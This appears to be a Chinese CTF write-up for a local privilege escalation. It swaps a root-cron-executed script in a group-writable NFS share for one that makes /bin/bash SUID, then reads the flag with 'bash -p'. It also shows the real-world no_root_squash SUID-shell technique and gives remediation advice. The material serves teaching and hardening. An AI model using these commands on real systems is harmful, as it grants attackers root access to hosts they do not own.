## 二、题目考点

1. **`root_squash` 与 `no_root_squash`**：默认 `root_squash` 把客户端 root 映射为 `nobody`；写了 `no_root_squash` 后，客户端 root 写入的文件在服务端**保持 root 属主**。
2. **导出目录权限**：`0775 root:nfs` 且**没有 sticky 位** —— 组内成员不仅能创建文件，还能**删除 root 的既有文件**（`/tmp` 之所以安全，正是因为它有 `+t`）。
3. **真正的漏洞不是 squash 本身**，而是“root 定时任务从**可写共享目录**里执行脚本”——这与第 3、5 题同源，只是换了 NFS 的外壳。
4. **覆盖 vs 替换的区别**：`> share-check.sh` 需要文件写权限（root 755，失败）；`rm` + 重建只需要**目录写权限**，所以必须走这条路。
5. **等待周期**：cron 一分钟一次，验证时要把“替换”卡在 cron tick 之后，否则容易误判为失败。

## 三、解题过程

### 3.1 第一步：确认导出与目录权限

```bash
id
# uid=1001(player) gid=1001(player) groups=1001(player),996(nfs)

cat /etc/exports
# /srv/nfs-share 192.168.0.0/16(rw,sync,no_root_squash,insecure)

ls -ld /srv/nfs-share
# drwxrwxr-x 1 root nfs 4096 /srv/nfs-share     <-- 组可写，无 sticky

ls -l /srv/nfs-share/ /etc/cron.d/share /usr/local/sbin/nfsmnt.sh
# -rwxr-xr-x 1 root root share-check.sh
# -rw-r--r-- 1 root root /etc/cron.d/share
```

### 3.2 第二步：看清谁在执行共享里的东西

```bash
cat /etc/cron.d/share
# * * * * * root /usr/local/sbin/nfsmnt.sh && /bin/bash /srv/nfs-share/share-check.sh

tail -2 /var/log/share-check.log
# [..] share-check running as root on <hostname>
```

root 每分钟都会执行 `/srv/nfs-share/share-check.sh` —— 而它在 `nfs` 组可写、且没有 sticky 位的目录里。

### 3.3 第三步：确认控制文件都碰不到

```bash
echo x >> /etc/exports               # Permission denied
echo x >> /etc/cron.d/share          # Permission denied
touch /usr/local/sbin/nfsmnt.sh      # Permission denied
echo '#!/bin/bash' > /srv/nfs-share/share-check.sh
# bash: /srv/nfs-share/share-check.sh: Permission denied   <-- 覆盖文件不行
```

### 3.4 第四步：删掉它，再放一个同名脚本

```bash
rm -f /srv/nfs-share/share-check.sh
printf '#!/bin/bash\nchmod 4755 /bin/bash\n' > /srv/nfs-share/share-check.sh
chmod +x /srv/nfs-share/share-check.sh
ls -l /srv/nfs-share/
# -rwxrwxr-x 1 player player 33 share-check.sh
```

关键：目录无 sticky 位，`rm` 只需要目录写权限，所以 root 的文件也能被删除。

### 3.5 第五步：等一个周期，收 SUID bash

```bash
sleep 65
ls -l /bin/bash
# -rwsr-xr-x 1 root root 1446024 /bin/bash     <-- cron 给我们设的 SUID

/bin/bash -p -c 'id; cat /flag.txt'
# uid=1001(player) gid=1001(player) euid=0(root)
# Ly_Flag{2c43zc1w}
```

### 4.1 构建期发现并修复的缺陷（重要）

首版 `nfsmnt.sh` 用了 `cp -a "$CLIENT"/. "$SHARE"/`。`cp -a` 带 `/.` 时会把**源目录自身的属主与权限**一并复制到目标目录上，于是第一次 cron 执行后：

```text
drwxr-xr-x 1 root root 4096 /srv/nfs-share      <-- 0775 root:nfs 被冲掉
```

漏洞因此在运行 1 分钟后**自动消失**（`rm` 变成 Permission denied）。已改为只复制条目、不触碰目录自身属性：

```bash
find "$CLIENT" -mindepth 1 -maxdepth 1 -print0 | xargs -0 -r cp -a -t "$SHARE"
```

重建后实测：cron 跑过多轮，`/srv/nfs-share` 始终保持 `drwxrwxr-x root nfs`，唯一解稳定可复现。**这一条也是本题的隐性陷阱：任何“同步/挂载”脚本都不能用 `src/.` 语法，否则会把共享目录的权限一起改掉。**

### 4.2 唯一解性说明

| 其他思路 | 实测结果 |
| --- | --- |
| 改 `/etc/exports` / `/etc/cron.d/share` | 0644 root，Permission denied |
| 改 `/usr/local/sbin/nfsmnt.sh` | 0755 root 且不在共享内，不可写 |
| 往 `/var/nfs/client` 塞 root 属主文件 | 0755 root，不可写 |
| 覆盖（而非替换）共享里的脚本 | 文件属主 root 0755，不可写 |
| 只放同名文件但保留原脚本 | 执行路径固定，必须替换 |

## 六、修复建议

1. **导出加 `root_squash`**（这是默认值，去掉 `no_root_squash` 即可）；确有需要时按主机/用户精确放行，不要整段网段开 `no_root_squash`。
2. **共享只放数据，不放代码**：要执行的脚本必须放在共享之外的只读路径（如 `/usr/local/libexec`）。
3. **给导出目录加 sticky 位**（`chmod +t`）并收紧组权限到 `0770` 以内；NFS 侧同时配置 `all_squash`/`anonuid` 兜底。
4. **cron 里不要执行来自网络存储的内容**：先 `sha256sum` 校验再执行，或干脆做成镜像内置脚本。
5. **监控**：`/srv` 下任何 root 属主文件的删除/替换都要告警；`auditd -w /srv/nfs-share -p wa`。

## 七、教学要点

1. `no_root_squash` 的含义只需记住一句：客户端 root 的文件到服务端**还是 root 的**。
2. 目录权限要看两位：**组写位**决定能不能建/删，**sticky 位**决定能不能删别人的。本题两个条件缺一不可。
3. 覆盖文件 ≠ 替换文件：前者要文件写权限，后者只要目录写权限。遇到“root 拥有的脚本在可写目录里”，先想 `rm` 再想 `>`。
4. 时间型题目要先对齐周期再动手，避免把“还没到点”误判成“利用失败”。
5. 同步脚本用 `cp -a src/. dst` 会顺手改掉目标目录权限——这个坑在真实运维里同样成立。

## 八、真实环境对照（模拟 vs 真实）

本题容器内**没有真正的 NFS mount**：`nfsmnt.sh` 用 `cp -a` 把客户端目录同步到共享，
靠“复制时保留 root 属主”来等价 `no_root_squash` 的效果。真实环境里的同一链条如下。

### 8.1 服务端导出配置

```bash
# /etc/exports
/srv/nfs-share *(rw,sync,no_root_squash,no_subtree_check)

exportfs -ra          # 重新导出
showmount -e localhost
```

### 8.2 客户端造一个 root 属主的 SUID

只有 `no_root_squash` 才成立：客户端 root 写入的文件，在服务端仍然保持 root 属主。

```bash
mount -t nfs 10.0.0.5:/srv/nfs-share /mnt
cp /bin/bash /mnt/rootsh
chmod 4755 /mnt/rootsh
ls -l /mnt/rootsh       # -rwsr-xr-x root root
```

### 8.3 服务端 root cron 从共享执行脚本

```bash
# /etc/cron.d/share：* * * * * root /usr/local/sbin/nfsmnt.sh
# 脚本从 /srv/nfs-share 执行，等于每分钟以 root 跑一次共享里的代码
/mnt/rootsh -p -c 'id; cat /flag.txt'
# uid=0(root) euid=0(root) ... Ly_Flag{...}
```

### 8.4 与本题的差异与边界

| 项 | 本题（模拟） | 真实环境 |
| --- | --- | --- |
| 共享实现 | `cp -a` 定时同步目录 | 内核 NFS 客户端/服务端 |
| root 属主 | `cp -a` 保留属主模拟 | `no_root_squash` 保留属主 |
| 启动要求 | 普通容器即可 | 需 `--privileged` + `SYS_ADMIN` 才能 `mount` |
| 风险 | 仅在容器内提权 | 客户端 root 可在服务端留下 root 代码 |

> 默认的 `root_squash` 会把客户端 root 映射成 `nobody`，根本写不出 root 属主文件——所以真实利用的前提就是导出里显式写了 `no_root_squash`（或不写 squash 选项的老配置）。真实验只能在隔离实验机上做，共享设备上不要开。
